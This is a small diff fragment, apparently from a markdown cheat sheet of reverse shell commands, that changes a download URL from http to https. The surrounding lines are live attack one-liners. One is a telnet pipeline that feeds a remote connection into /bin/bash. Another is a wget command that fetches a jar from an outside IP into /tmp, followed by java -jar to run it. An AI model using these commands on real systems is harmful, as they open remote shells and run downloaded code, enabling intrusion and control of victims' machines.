@@ -97,7 +97,7 @@ telnet 1.1.1.1 10086 | /bin/bash | telnet 1.1.1.1 10087; # Remember to listen on
 java jar shell
 
 ```java
-wget http://1.1.1.1:9999/revs.jar -O /tmp/revs1.jar;
+wget https://1.1.1.1:9999/revs.jar -O /tmp/revs1.jar;
 
 java -jar /tmp/revs1.jar;
 
